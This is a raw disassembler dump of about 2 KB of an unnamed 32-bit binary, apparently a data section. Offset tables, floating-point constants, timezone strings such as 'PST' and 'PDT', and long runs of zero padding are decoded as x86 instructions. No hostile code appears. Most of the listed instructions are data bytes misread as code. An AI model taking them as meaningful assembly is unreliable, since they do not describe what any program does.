0000674E  1E                push ds
0000674F  00C8              add al,cl
00006751  5B                pop ebx
00006752  1E                push ds
00006753  00C4              add ah,al
00006755  5B                pop ebx
00006756  1E                push ds
00006757  00C0              add al,al
00006759  5B                pop ebx
0000675A  1E                push ds
0000675B  00B85B1E00B0      add [eax+0xb0001e5b],bh
00006761  5B                pop ebx
00006762  1E                push ds
00006763  00A85B1E009C      add [eax+0x9c001e5b],ch
00006769  5B                pop ebx
0000676A  1E                push ds
0000676B  00905B1E0088      add [eax+0x88001e5b],dl
00006771  5B                pop ebx
00006772  1E                push ds
00006773  007C5B1E          add [ebx+ebx*2+0x1e],bh
00006777  00785B            add [eax+0x5b],bh
0000677A  1E                push ds
0000677B  00745B1E          add [ebx+ebx*2+0x1e],dh
0000677F  00705B            add [eax+0x5b],dh
00006782  1E                push ds
00006783  006C5B1E          add [ebx+ebx*2+0x1e],ch
00006787  00685B            add [eax+0x5b],ch
0000678A  1E                push ds
0000678B  00645B1E          add [ebx+ebx*2+0x1e],ah
0000678F  00605B            add [eax+0x5b],ah
00006792  1E                push ds
00006793  005C5B1E          add [ebx+ebx*2+0x1e],bl
00006797  00585B            add [eax+0x5b],bl
0000679A  1E                push ds
0000679B  00545B1E          add [ebx+ebx*2+0x1e],dl
0000679F  00505B            add [eax+0x5b],dl
000067A2  1E                push ds
000067A3  004C5B1E          add [ebx+ebx*2+0x1e],cl
000067A7  00445B1E          add [ebx+ebx*2+0x1e],al
000067AB  0038              add [eax],bh
000067AD  5B                pop ebx
000067AE  1E                push ds
000067AF  0030              add [eax],dh
000067B1  5B                pop ebx
000067B2  1E                push ds
000067B3  0028              add [eax],ch
000067B5  5B                pop ebx
000067B6  1E                push ds
000067B7  00685B            add [eax+0x5b],ch
000067BA  1E                push ds
000067BB  0020              add [eax],ah
000067BD  5B                pop ebx
000067BE  1E                push ds
000067BF  0018              add [eax],bl
000067C1  5B                pop ebx
000067C2  1E                push ds
000067C3  0010              add [eax],dl
000067C5  5B                pop ebx
000067C6  1E                push ds
000067C7  00045B            add [ebx+ebx*2],al
000067CA  1E                push ds
000067CB  00FC              add ah,bh
000067CD  5A                pop edx
000067CE  1E                push ds
000067CF  00F0              add al,dh
000067D1  5A                pop edx
000067D2  1E                push ds
000067D3  00E4              add ah,ah
000067D5  5A                pop edx
000067D6  1E                push ds
000067D7  00E0              add al,ah
000067D9  5A                pop edx
000067DA  1E                push ds
000067DB  00DC              add ah,bl
000067DD  5A                pop edx
000067DE  1E                push ds
000067DF  00D4              add ah,dl
000067E1  5A                pop edx
000067E2  1E                push ds
000067E3  00C0              add al,al
000067E5  5A                pop edx
000067E6  1E                push ds
000067E7  00B85A1E0000      add [eax+0x1e5a],bh
000067ED  0000              add [eax],al
000067EF  002E              add [esi],ch
000067F1  0000              add [eax],al
000067F3  0000              add [eax],al
000067F5  0000              add [eax],al
000067F7  00F0              add al,dh
000067F9  671E              a16 push ds
000067FB  00906F1E0090      add [eax+0x90001e6f],dl
00006801  6F                outsd
00006802  1E                push ds
00006803  00906F1E0090      add [eax+0x90001e6f],dl
00006809  6F                outsd
0000680A  1E                push ds
0000680B  00906F1E0090      add [eax+0x90001e6f],dl
00006811  6F                outsd
00006812  1E                push ds
00006813  00906F1E0090      add [eax+0x90001e6f],dl
00006819  6F                outsd
0000681A  1E                push ds
0000681B  00906F1E007F      add [eax+0x7f001e6f],dl
00006821  7F7F              jg 0x68a2
00006823  7F7F              jg 0x68a4
00006825  7F7F              jg 0x68a6
00006827  7FF8              jg 0x6821
00006829  671E              a16 push ds
0000682B  0000              add [eax],al
0000682D  0000              add [eax],al
0000682F  0000              add [eax],al
00006831  0000              add [eax],al
00006833  0000              add [eax],al
00006835  0000              add [eax],al
00006837  0000              add [eax],al
00006839  A002400000        mov al,[0x4002]
0000683E  0000              add [eax],al
00006840  0000              add [eax],al
00006842  0000              add [eax],al
00006844  00C8              add al,cl
00006846  0540000000        add eax,0x40
0000684B  0000              add [eax],al
0000684D  0000              add [eax],al
0000684F  0000              add [eax],al
00006851  FA                cli
00006852  084000            or [eax+0x0],al
00006855  0000              add [eax],al
00006857  0000              add [eax],al
00006859  0000              add [eax],al
0000685B  00409C            add [eax-0x64],al
0000685E  0C40              or al,0x40
00006860  0000              add [eax],al
00006862  0000              add [eax],al
00006864  0000              add [eax],al
00006866  0000              add [eax],al
00006868  50                push eax
00006869  C3                ret
0000686A  0F4000            cmovo eax,[eax]
0000686D  0000              add [eax],al
0000686F  0000              add [eax],al
00006871  0000              add [eax],al
00006873  0024F4            add [esp+esi*8],ah
00006876  124000            adc al,[eax+0x0]
00006879  0000              add [eax],al
0000687B  0000              add [eax],al
0000687D  0000              add [eax],al
0000687F  80969816400000    adc byte [esi+0x401698],0x0
00006886  0000              add [eax],al
00006888  0000              add [eax],al
0000688A  0020              add [eax],ah
0000688C  BCBE194000        mov esp,0x4019be
00006891  0000              add [eax],al
00006893  0000              add [eax],al
00006895  04BF              add al,0xbf
00006897  C9                leave
00006898  1B8E34400000      sbb ecx,[esi+0x4034]
0000689E  00A1EDCCCE1B      add [ecx+0x1bcecced],ah
000068A4  C2D34E            ret 0x4ed3
000068A7  40                inc eax
000068A8  20F0              and al,dh
000068AA  9E                sahf
000068AB  B570              mov ch,0x70
000068AD  2BA8ADC59D69      sub ebp,[eax+0x699dc5ad]
000068B3  40                inc eax
000068B4  D05DFD            rcr byte [ebp-0x3],1
000068B7  25E51A8E4F        and eax,0x4f8e1ae5
000068BC  19EB              sbb ebx,ebp
000068BE  83407196          add dword [eax+0x71],byte -0x6a
000068C2  D7                xlatb
000068C3  95                xchg eax,ebp
000068C4  43                inc ebx
000068C5  0E                push cs
000068C6  058D29AF9E        add eax,0x9eaf298d
000068CB  40                inc eax
000068CC  F9                stc
000068CD  BFA044ED81        mov edi,0x81ed44a0
000068D2  128F8182B940      adc cl,[edi+0x40b98281]
000068D8  BF3CD5A6CF        mov edi,0xcfa6d53c
000068DD  FF491F            dec dword [ecx+0x1f]
000068E0  78C2              js 0x68a4
000068E2  D3406F            rol dword [eax+0x6f],cl
000068E5  C6                db 0xC6
000068E6  E08C              loopne 0x6874
000068E8  E980C947BA        jmp 0xba48326d
000068ED  93                xchg eax,ebx
000068EE  A841              test al,0x41
000068F0  BC856B5527        mov esp,0x27556b85
000068F5  398DF770E07C      cmp [ebp+0x7ce070f7],ecx
000068FB  42                inc edx
000068FC  BCDD8EDEF9        mov esp,0xf9de8edd
00006901  9D                popf
00006902  FB                sti
00006903  EB7E              jmp short 0x6983
00006905  AA                stosb
00006906  51                push ecx
00006907  43                inc ebx
00006908  A1E676E3CC        mov eax,[0xcce376e6]
0000690D  F2292F            repne sub [edi],ebp
00006910  848126442810      test [ecx+0x10284426],al
00006916  17                pop ss
00006917  AA                stosb
00006918  F8                clc
00006919  AE                scasb
0000691A  10E3              adc bl,ah
0000691C  C5                db 0xC5
0000691D  C4                db 0xC4
0000691E  FA                cli
0000691F  44                inc esp
00006920  EBA7              jmp short 0x68c9
00006922  D4F3              aam 0xf3
00006924  F7EB              imul ebx
00006926  E14A              loope 0x6972
00006928  7A95              jpe 0x68bf
0000692A  CF                iret
0000692B  45                inc ebp
0000692C  65CC              gs int3
0000692E  C7                db 0xC7
0000692F  91                xchg eax,ecx
00006930  0E                push cs
00006931  A6                cmpsb
00006932  AE                scasb
00006933  A019E3A346        mov al,[0x46a3e319]
00006938  0D65170C75        or eax,0x750c1765
0000693D  81867576C9484D58  add dword [esi+0x48c97675],0xe442584d
         -42E4
00006947  A7                cmpsd
00006948  93                xchg eax,ebx
00006949  393B              cmp [ebx],edi
0000694B  35B8B2ED53        xor eax,0x53edb2b8
00006950  4D                dec ebp
00006951  A7                cmpsd
00006952  E55D              in eax,0x5d
00006954  3DC55D3B8B        cmp eax,0x8b3b5dc5
00006959  9E                sahf
0000695A  92                xchg eax,edx
0000695B  5A                pop edx
0000695C  FF5DA6            call far [ebp-0x5a]
0000695F  F0A120C054A5      lock mov eax,[0xa554c020]
00006965  8C37              mov [edi],segr6
00006967  61                popa
00006968  D1FD              sar ebp,1
0000696A  8B5A8B            mov ebx,[edx-0x75]
0000696D  D8255D89F9DB      fsub dword [0xdbf9895d]
00006973  67AA              a16 stosb
00006975  95                xchg eax,ebp
00006976  F8                clc
00006977  F327              rep daa
00006979  BFA2C85DDD        mov edi,0xdd5dc8a2
0000697E  806E4CC9          sub byte [esi+0x4c],0xc9
00006982  9B                wait
00006983  97                xchg eax,edi
00006984  208A025260C4      and [edx+0xc4605202],cl
0000698A  2575000000        and eax,0x75
0000698F  00CD              add ch,cl
00006991  CC                int3
00006992  CDCC              int 0xcc
00006994  CC                int3
00006995  CC                int3
00006996  CC                int3
00006997  CC                int3
00006998  CC                int3
00006999  CC                int3
0000699A  FB                sti
0000699B  3F                aas
0000699C  713D              jno 0x69db
0000699E  0AD7              or dl,bh
000069A0  A3703D0AD7        mov [0xd70a3d70],eax
000069A5  A3F83F5A64        mov [0x645a3ff8],eax
000069AA  3BDF              cmp ebx,edi
000069AC  4F                dec edi
000069AD  8D976E1283F5      lea edx,[edi+0xf583126e]
000069B3  3F                aas
000069B4  C3                ret
000069B5  D32C6519E25817    shr dword [0x1758e219],cl
000069BC  B7D1              mov bh,0xd1
000069BE  F1                int1
000069BF  3F                aas
000069C0  D00F              ror byte [edi],1
000069C2  2384471B47ACC5    and eax,[edi+eax*2+0xc5ac471b]
000069C9  A7                cmpsd
000069CA  EE                out dx,al
000069CB  3F                aas
000069CC  40                inc eax
000069CD  A6                cmpsb
000069CE  B669              mov dh,0x69
000069D0  6C                insb
000069D1  AF                scasd
000069D2  05BD3786EB        add eax,0xeb8637bd
000069D7  3F                aas
000069D8  333DBC427AE5      xor edi,[0xe57a42bc]
000069DE  D594              aad 0x94
000069E0  BFD6E73FC2        mov edi,0xc23fe7d6
000069E5  FD                std
000069E6  FD                std
000069E7  CE                into
000069E8  61                popa
000069E9  8411              test [ecx],dl
000069EB  77CC              ja 0x69b9
000069ED  AB                stosd
000069EE  E43F              in al,0x3f
000069F0  2F                das
000069F1  4C                dec esp
000069F2  5B                pop ebx
000069F3  E14D              loope 0x6a42
000069F5  C4BE9495E6C9      les edi,[esi+0xc9e69594]
000069FB  3F                aas
000069FC  92                xchg eax,edx
000069FD  C4533B            les edx,[ebx+0x3b]
00006A00  7544              jnz 0x6a46
00006A02  CD14              int 0x14
00006A04  BE9AAF3FDE        mov esi,0xde3faf9a
00006A09  67BA943945AD      a16 mov edx,0xad453994
00006A0F  1E                push ds
00006A10  B1CF              mov cl,0xcf
00006A12  94                xchg eax,esp
00006A13  3F                aas
00006A14  2423              and al,0x23
00006A16  C6                db 0xC6
00006A17  E2BC              loop 0x69d5
00006A19  BA3B31618B        mov edx,0x8b61313b
00006A1E  7A3F              jpe 0x6a5f
00006A20  61                popa
00006A21  55                push ebp
00006A22  59                pop ecx
00006A23  C17EB153          sar dword [esi-0x4f],0x53
00006A27  7C12              jl 0x6a3b
00006A29  BB5F3FD7EE        mov ebx,0xeed73f5f
00006A2E  2F                das
00006A2F  8D06              lea eax,[esi]
00006A31  BE928515FB        mov esi,0xfb158592
00006A36  44                inc esp
00006A37  3F                aas
00006A38  243F              and al,0x3f
00006A3A  A5                movsd
00006A3B  E939A527EA        jmp 0xea280f79
00006A40  7FA8              jg 0x69ea
00006A42  2A3F              sub bh,[edi]
00006A44  7DAC              jnl 0x69f2
00006A46  A1E4BC647C        mov eax,[0x7c64bce4]
00006A4B  46                inc esi
00006A4C  D0DD              rcr ch,1
00006A4E  55                push ebp
00006A4F  3E637B06          arpl [ds:ebx+0x6],di
00006A53  CC                int3
00006A54  23547783          and edx,[edi+esi*2-0x7d]
00006A58  FF91813D91FA      call near [ecx+0xfa913d81]
00006A5E  3A19              cmp bl,[ecx]
00006A60  7A63              jpe 0x6ac5
00006A62  254331C0AC        and eax,0xacc03143
00006A67  3C21              cmp al,0x21
00006A69  89D1              mov ecx,edx
00006A6B  38824797B800      cmp [edx+0xb89747],al
00006A71  FD                std
00006A72  D7                xlatb
00006A73  3BDC              cmp ebx,esp
00006A75  885808            mov [eax+0x8],bl
00006A78  1BB1E8E386A6      sbb esi,[ecx+0xa686e3e8]
00006A7E  033B              add edi,[ebx]
00006A80  C684454207B69975  mov byte [ebp+eax*2+0x99b60742],0x75
00006A88  37                aaa
00006A89  DB2E              fld tword [esi]
00006A8B  3A33              cmp dh,[ebx]
00006A8D  711C              jno 0x6aab
00006A8F  D223              shl byte [ebx],cl
00006A91  DB                db 0xDB
00006A92  32EE              xor ch,dh
00006A94  49                dec ecx
00006A95  90                nop
00006A96  5A                pop edx
00006A97  39A687BEC057      cmp [esi+0x57c0be87],esp
00006A9D  DAA582A6A2B5      fisub dword [ebp+0xb5a2a682]
00006AA3  32E2              xor ah,dl
00006AA5  68B211A752        push dword 0x52a711b2
00006AAA  9F                lahf
00006AAB  44                inc esp
00006AAC  59                pop ecx
00006AAD  B710              mov bh,0x10
00006AAF  2C25              sub al,0x25
00006AB1  49                dec ecx
00006AB2  E42D              in al,0x2d
00006AB4  36344F            ss xor al,0x4f
00006AB7  53                push ebx
00006AB8  AE                scasb
00006AB9  CE                into
00006ABA  6B258F5904A4C0    imul esp,[0xa404598f],byte -0x40
00006AC1  DEC2              faddp st2
00006AC3  7DFB              jnl 0x6ac0
00006AC5  E8C61E9EE7        call 0xe79e8990
00006ACA  885A57            mov [edx+0x57],bl
00006ACD  91                xchg eax,ecx
00006ACE  3CBF              cmp al,0xbf
00006AD0  50                push eax
00006AD1  832218            and dword [edx],byte +0x18
00006AD4  4E                dec esi
00006AD5  4B                dec ebx
00006AD6  65                db 0x65
00006AD7  62                db 0x62
00006AD8  FD                std
00006AD9  838FAF06947D11    or dword [edi+0x7d9406af],byte +0x11
00006AE0  E42D              in al,0x2d
00006AE2  DE9FCED2C804      ficomp word [edi+0x4c8d2ce]
00006AE8  DDA6D80A0000      frstor [esi+0xad8]
00006AEE  0000              add [eax],al
00006AF0  0102              add [edx],eax
00006AF2  0408              add al,0x8
00006AF4  0000              add [eax],al
00006AF6  0000              add [eax],al
00006AF8  A4                movsb
00006AF9  0300              add eax,[eax]
00006AFB  006082            add [eax-0x7e],ah
00006AFE  7982              jns 0x6a82
00006B00  2100              and [eax],eax
00006B02  0000              add [eax],al
00006B04  0000              add [eax],al
00006B06  0000              add [eax],al
00006B08  A6                cmpsb
00006B09  DF00              fild word [eax]
00006B0B  0000              add [eax],al
00006B0D  0000              add [eax],al
00006B0F  00A1A5000000      add [ecx+0xa5],ah
00006B15  0000              add [eax],al
00006B17  00819FE0FC00      add [ecx+0xfce09f],al
00006B1D  0000              add [eax],al
00006B1F  00407E            add [eax+0x7e],al
00006B22  80FC00            cmp ah,0x0
00006B25  0000              add [eax],al
00006B27  00A8030000C1      add [eax+0xc1000003],ch
00006B2D  A3DAA32000        mov [0x20a3da],eax
00006B32  0000              add [eax],al
00006B34  0000              add [eax],al
00006B36  0000              add [eax],al
00006B38  0000              add [eax],al
00006B3A  0000              add [eax],al
00006B3C  0000              add [eax],al
00006B3E  0000              add [eax],al
00006B40  0000              add [eax],al
00006B42  0000              add [eax],al
00006B44  0000              add [eax],al
00006B46  0000              add [eax],al
00006B48  81FE00000000      cmp esi,0x0
00006B4E  0000              add [eax],al
00006B50  40                inc eax
00006B51  FE00              inc byte [eax]
00006B53  0000              add [eax],al
00006B55  0000              add [eax],al
00006B57  00B5030000C1      add [ebp+0xc1000003],dh
00006B5D  A3DAA32000        mov [0x20a3da],eax
00006B62  0000              add [eax],al
00006B64  0000              add [eax],al
00006B66  0000              add [eax],al
00006B68  0000              add [eax],al
00006B6A  0000              add [eax],al
00006B6C  0000              add [eax],al
00006B6E  0000              add [eax],al
00006B70  0000              add [eax],al
00006B72  0000              add [eax],al
00006B74  0000              add [eax],al
00006B76  0000              add [eax],al
00006B78  81FE00000000      cmp esi,0x0
00006B7E  0000              add [eax],al
00006B80  41                inc ecx
00006B81  FE00              inc byte [eax]
00006B83  0000              add [eax],al
00006B85  0000              add [eax],al
00006B87  00B6030000CF      add [esi+0xcf000003],dh
00006B8D  A2E4A21A00        mov [0x1aa2e4],al
00006B92  E5A2              in eax,0xa2
00006B94  E8A25B0000        call 0xc73b
00006B99  0000              add [eax],al
00006B9B  0000              add [eax],al
00006B9D  0000              add [eax],al
00006B9F  0000              add [eax],al
00006BA1  0000              add [eax],al
00006BA3  0000              add [eax],al
00006BA5  0000              add [eax],al
00006BA7  0081FE000000      add [ecx+0xfe],al
00006BAD  0000              add [eax],al
00006BAF  00407E            add [eax+0x7e],al
00006BB2  A1FE000000        mov eax,[0xfe]
00006BB7  005105            add [ecx+0x5],dl
00006BBA  0000              add [eax],al
00006BBC  51                push ecx
00006BBD  DA5EDA            ficomp dword [esi-0x26]
00006BC0  2000              and [eax],al
00006BC2  5F                pop edi
00006BC3  DA6ADA            fisubr dword [edx-0x26]
00006BC6  3200              xor al,[eax]
00006BC8  0000              add [eax],al
00006BCA  0000              add [eax],al
00006BCC  0000              add [eax],al
00006BCE  0000              add [eax],al
00006BD0  0000              add [eax],al
00006BD2  0000              add [eax],al
00006BD4  0000              add [eax],al
00006BD6  0000              add [eax],al
00006BD8  81D3D8DEE0F9      adc ebx,0xf9e0ded8
00006BDE  0000              add [eax],al
00006BE0  317E81            xor [esi-0x7f],edi
00006BE3  FE00              inc byte [eax]
00006BE5  0000              add [eax],al
00006BE7  008070000001      add [eax+0x1000070],al
00006BED  0000              add [eax],al
00006BEF  00F0              add al,dh
00006BF1  F1                int1
00006BF2  FF                db 0xFF
00006BF3  FF5053            call near [eax+0x53]
00006BF6  54                push esp
00006BF7  0000              add [eax],al
00006BF9  0000              add [eax],al
00006BFB  0000              add [eax],al
00006BFD  0000              add [eax],al
00006BFF  0000              add [eax],al
00006C01  0000              add [eax],al
00006C03  0000              add [eax],al
00006C05  0000              add [eax],al
00006C07  0000              add [eax],al
00006C09  0000              add [eax],al
00006C0B  0000              add [eax],al
00006C0D  0000              add [eax],al
00006C0F  0000              add [eax],al
00006C11  0000              add [eax],al
00006C13  0000              add [eax],al
00006C15  0000              add [eax],al
00006C17  0000              add [eax],al
00006C19  0000              add [eax],al
00006C1B  0000              add [eax],al
00006C1D  0000              add [eax],al
00006C1F  0000              add [eax],al
00006C21  0000              add [eax],al
00006C23  0000              add [eax],al
00006C25  0000              add [eax],al
00006C27  0000              add [eax],al
00006C29  0000              add [eax],al
00006C2B  0000              add [eax],al
00006C2D  0000              add [eax],al
00006C2F  0000              add [eax],al
00006C31  0000              add [eax],al
00006C33  005044            add [eax+0x44],dl
00006C36  54                push esp
00006C37  0000              add [eax],al
00006C39  0000              add [eax],al
00006C3B  0000              add [eax],al
00006C3D  0000              add [eax],al
00006C3F  0000              add [eax],al
00006C41  0000              add [eax],al
00006C43  0000              add [eax],al
00006C45  0000              add [eax],al
00006C47  0000              add [eax],al
00006C49  0000              add [eax],al
00006C4B  0000              add [eax],al
00006C4D  0000              add [eax],al
00006C4F  0000              add [eax],al
00006C51  0000              add [eax],al
00006C53  0000              add [eax],al
00006C55  0000              add [eax],al
00006C57  0000              add [eax],al
00006C59  0000              add [eax],al
00006C5B  0000              add [eax],al
00006C5D  0000              add [eax],al
00006C5F  0000              add [eax],al
00006C61  0000              add [eax],al
00006C63  0000              add [eax],al
00006C65  0000              add [eax],al
00006C67  0000              add [eax],al
00006C69  0000              add [eax],al
00006C6B  0000              add [eax],al
00006C6D  0000              add [eax],al
00006C6F  0000              add [eax],al
00006C71  0000              add [eax],al
00006C73  00F4              add ah,dh
00006C75  6B1E00            imul ebx,[esi],byte +0x0
00006C78  346C              xor al,0x6c
00006C7A  1E                push ds
00006C7B  0000              add [eax],al
00006C7D  0000              add [eax],al
00006C7F  00FF              add bh,bh
00006C81  FF                db 0xFF
00006C82  FF                db 0xFF
00006C83  FF00              inc dword [eax]
00006C85  0000              add [eax],al
00006C87  0000              add [eax],al
00006C89  0000              add [eax],al
00006C8B  0000              add [eax],al
00006C8D  0000              add [eax],al
00006C8F  00FF              add bh,bh
00006C91  FF                db 0xFF
00006C92  FF                db 0xFF
00006C93  FF00              inc dword [eax]
00006C95  0000              add [eax],al
00006C97  0000              add [eax],al
00006C99  0000              add [eax],al
00006C9B  0000              add [eax],al
00006C9D  0000              add [eax],al
00006C9F  00FF              add bh,bh
00006CA1  FF                db 0xFF
00006CA2  FF                db 0xFF
00006CA3  FF1E              call far [esi]
00006CA5  0000              add [eax],al
00006CA7  003B              add [ebx],bh
00006CA9  0000              add [eax],al
00006CAB  005A00            add [edx+0x0],bl
00006CAE  0000              add [eax],al
00006CB0  7800              js 0x6cb2
00006CB2  0000              add [eax],al
00006CB4  97                xchg eax,edi
00006CB5  0000              add [eax],al
00006CB7  00B5000000D4      add [ebp+0xd4000000],dh
00006CBD  0000              add [eax],al
00006CBF  00F3              add bl,dh
00006CC1  0000              add [eax],al
00006CC3  0011              add [ecx],dl
00006CC5  0100              add [eax],eax
00006CC7  0030              add [eax],dh
00006CC9  0100              add [eax],eax
00006CCB  004E01            add [esi+0x1],cl
00006CCE  0000              add [eax],al
00006CD0  6D                insd
00006CD1  0100              add [eax],eax
00006CD3  00FF              add bh,bh
00006CD5  FF                db 0xFF
00006CD6  FF                db 0xFF
00006CD7  FF1E              call far [esi]
00006CD9  0000              add [eax],al
00006CDB  003A              add [edx],bh
00006CDD  0000              add [eax],al
00006CDF  005900            add [ecx+0x0],bl
00006CE2  0000              add [eax],al
00006CE4  7700              ja 0x6ce6
00006CE6  0000              add [eax],al
00006CE8  96                xchg eax,esi
00006CE9  0000              add [eax],al
00006CEB  00B4000000D300    add [eax+eax+0xd30000],dh
00006CF2  0000              add [eax],al
00006CF4  F20000            repne add [eax],al
00006CF7  0010              add [eax],dl
00006CF9  0100              add [eax],eax
00006CFB  002F              add [edi],ch
00006CFD  0100              add [eax],eax
00006CFF  004D01            add [ebp+0x1],cl
00006D02  0000              add [eax],al
00006D04  6C                insb
00006D05  0100              add [eax],eax
00006D07  0000              add [eax],al
00006D09  0000              add [eax],al
00006D0B  0000              add [eax],al
00006D0D  0000              add [eax],al
00006D0F  0000              add [eax],al
00006D11  0000              add [eax],al
00006D13  0000              add [eax],al
00006D15  0000              add [eax],al
00006D17  0000              add [eax],al
00006D19  0000              add [eax],al
00006D1B  0000              add [eax],al
00006D1D  0000              add [eax],al
00006D1F  0000              add [eax],al
00006D21  0000              add [eax],al
00006D23  0000              add [eax],al
00006D25  0000              add [eax],al
00006D27  0000              add [eax],al
00006D29  0000              add [eax],al
00006D2B  0000              add [eax],al
00006D2D  0000              add [eax],al
00006D2F  0000              add [eax],al
00006D31  0000              add [eax],al
00006D33  0000              add [eax],al
00006D35  0000              add [eax],al
00006D37  0000              add [eax],al
00006D39  0000              add [eax],al
00006D3B  0000              add [eax],al
00006D3D  0000              add [eax],al
00006D3F  0000              add [eax],al
00006D41  0000              add [eax],al
00006D43  0000              add [eax],al
00006D45  0000              add [eax],al
00006D47  0000              add [eax],al
00006D49  0000              add [eax],al
00006D4B  0000              add [eax],al
00006D4D  0000              add [eax],al
00006D4F  0000              add [eax],al
00006D51  0000              add [eax],al
00006D53  0000              add [eax],al
00006D55  0000              add [eax],al
00006D57  0000              add [eax],al
00006D59  0000              add [eax],al
00006D5B  0000              add [eax],al
00006D5D  0000              add [eax],al
00006D5F  0000              add [eax],al
00006D61  0000              add [eax],al
00006D63  0000              add [eax],al
00006D65  0000              add [eax],al
00006D67  0000              add [eax],al
00006D69  0000              add [eax],al
00006D6B  0000              add [eax],al
00006D6D  0000              add [eax],al
00006D6F  0000              add [eax],al
00006D71  0000              add [eax],al
00006D73  0000              add [eax],al
00006D75  0000              add [eax],al
00006D77  0000              add [eax],al
00006D79  0000              add [eax],al
00006D7B  0000              add [eax],al
00006D7D  0000              add [eax],al
00006D7F  0000              add [eax],al
00006D81  0000              add [eax],al
00006D83  0000              add [eax],al
00006D85  0000              add [eax],al
00006D87  0000              add [eax],al
00006D89  0000              add [eax],al
00006D8B  0000              add [eax],al
00006D8D  0000              add [eax],al
00006D8F  0000              add [eax],al
00006D91  0000              add [eax],al
00006D93  0000              add [eax],al
00006D95  0000              add [eax],al
00006D97  0000              add [eax],al
00006D99  0000              add [eax],al
00006D9B  0000              add [eax],al
00006D9D  0000              add [eax],al
00006D9F  0000              add [eax],al
00006DA1  0000              add [eax],al
00006DA3  0000              add [eax],al
00006DA5  0000              add [eax],al
00006DA7  0000              add [eax],al
00006DA9  0000              add [eax],al
00006DAB  0000              add [eax],al
00006DAD  0000              add [eax],al
00006DAF  0000              add [eax],al
00006DB1  0000              add [eax],al
00006DB3  0000              add [eax],al
00006DB5  0000              add [eax],al
00006DB7  0000              add [eax],al
00006DB9  0000              add [eax],al
00006DBB  0000              add [eax],al
00006DBD  0000              add [eax],al
00006DBF  0000              add [eax],al
00006DC1  0000              add [eax],al
00006DC3  0000              add [eax],al
00006DC5  0000              add [eax],al
00006DC7  0000              add [eax],al
00006DC9  0000              add [eax],al
00006DCB  0000              add [eax],al
00006DCD  0000              add [eax],al
00006DCF  0000              add [eax],al
00006DD1  0000              add [eax],al
00006DD3  0000              add [eax],al
00006DD5  0000              add [eax],al
00006DD7  0000              add [eax],al
00006DD9  0000              add [eax],al
00006DDB  0000              add [eax],al
00006DDD  0000              add [eax],al
00006DDF  0000              add [eax],al
00006DE1  0000              add [eax],al
00006DE3  0000              add [eax],al
00006DE5  0000              add [eax],al
00006DE7  0000              add [eax],al
00006DE9  0000              add [eax],al
00006DEB  0000              add [eax],al
00006DED  0000              add [eax],al
00006DEF  0000              add [eax],al
00006DF1  0000              add [eax],al
00006DF3  0000              add [eax],al
00006DF5  0000              add [eax],al
00006DF7  0000              add [eax],al
00006DF9  0000              add [eax],al
00006DFB  0000              add [eax],al
00006DFD  0000              add [eax],al
00006DFF  0000              add [eax],al
00006E01  0000              add [eax],al
00006E03  0000              add [eax],al
00006E05  0000              add [eax],al
00006E07  0000              add [eax],al
00006E09  0000              add [eax],al
00006E0B  0000              add [eax],al
00006E0D  0000              add [eax],al
00006E0F  0000              add [eax],al
00006E11  0000              add [eax],al
00006E13  0000              add [eax],al
00006E15  0000              add [eax],al
00006E17  0000              add [eax],al
00006E19  0000              add [eax],al
00006E1B  0000              add [eax],al
00006E1D  0000              add [eax],al
00006E1F  0000              add [eax],al
00006E21  0000              add [eax],al
00006E23  0000              add [eax],al
00006E25  0000              add [eax],al
00006E27  0000              add [eax],al
00006E29  0000              add [eax],al
00006E2B  0000              add [eax],al
00006E2D  0000              add [eax],al
00006E2F  0000              add [eax],al
00006E31  0000              add [eax],al
00006E33  0000              add [eax],al
00006E35  0000              add [eax],al
00006E37  0000              add [eax],al
00006E39  0000              add [eax],al
00006E3B  0000              add [eax],al
00006E3D  0000              add [eax],al
00006E3F  0000              add [eax],al
00006E41  0000              add [eax],al
00006E43  0000              add [eax],al
00006E45  0000              add [eax],al
00006E47  0000              add [eax],al
00006E49  0000              add [eax],al
00006E4B  0000              add [eax],al
00006E4D  0000              add [eax],al
00006E4F  0000              add [eax],al
00006E51  0000              add [eax],al
00006E53  0000              add [eax],al
00006E55  0000              add [eax],al
00006E57  0000              add [eax],al
00006E59  0000              add [eax],al
00006E5B  0000              add [eax],al
00006E5D  0000              add [eax],al
00006E5F  0000              add [eax],al
00006E61  0000              add [eax],al
00006E63  0000              add [eax],al
00006E65  0000              add [eax],al
00006E67  0000              add [eax],al
00006E69  0000              add [eax],al
00006E6B  0000              add [eax],al
00006E6D  0000              add [eax],al
00006E6F  0000              add [eax],al
00006E71  0000              add [eax],al
00006E73  0000              add [eax],al
00006E75  0000              add [eax],al
00006E77  0000              add [eax],al
00006E79  0000              add [eax],al
00006E7B  0000              add [eax],al
00006E7D  0000              add [eax],al
00006E7F  0000              add [eax],al
00006E81  0000              add [eax],al
00006E83  0000              add [eax],al
00006E85  0000              add [eax],al
00006E87  0000              add [eax],al
00006E89  0000              add [eax],al
00006E8B  0000              add [eax],al
00006E8D  0000              add [eax],al
00006E8F  0000              add [eax],al
00006E91  0000              add [eax],al
00006E93  0000              add [eax],al
00006E95  0000              add [eax],al
00006E97  0000              add [eax],al
00006E99  0000              add [eax],al
00006E9B  0000              add [eax],al
00006E9D  0000              add [eax],al
00006E9F  0000              add [eax],al
00006EA1  0000              add [eax],al
00006EA3  0000              add [eax],al
00006EA5  0000              add [eax],al
00006EA7  0000              add [eax],al
00006EA9  0000              add [eax],al
00006EAB  0000              add [eax],al
00006EAD  0000              add [eax],al
00006EAF  0000              add [eax],al
00006EB1  0000              add [eax],al
00006EB3  0000              add [eax],al
00006EB5  0000              add [eax],al
00006EB7  0000              add [eax],al
00006EB9  0000              add [eax],al
00006EBB  0000              add [eax],al
00006EBD  0000              add [eax],al
00006EBF  0000              add [eax],al
00006EC1  0000              add [eax],al
00006EC3  0000              add [eax],al
00006EC5  0000              add [eax],al
00006EC7  0000              add [eax],al
00006EC9  0000              add [eax],al
00006ECB  0000              add [eax],al
00006ECD  0000              add [eax],al
00006ECF  0000              add [eax],al
00006ED1  0000              add [eax],al
00006ED3  0000              add [eax],al
00006ED5  0000              add [eax],al
00006ED7  0000              add [eax],al
00006ED9  0000              add [eax],al
00006EDB  0000              add [eax],al
00006EDD  0000              add [eax],al
00006EDF  0000              add [eax],al
00006EE1  0000              add [eax],al
00006EE3  0000              add [eax],al
00006EE5  0000              add [eax],al
00006EE7  0000              add [eax],al
00006EE9  0000              add [eax],al
00006EEB  0000              add [eax],al
00006EED  0000              add [eax],al
00006EEF  0000              add [eax],al
00006EF1  0000              add [eax],al
00006EF3  0000              add [eax],al
00006EF5  0000              add [eax],al
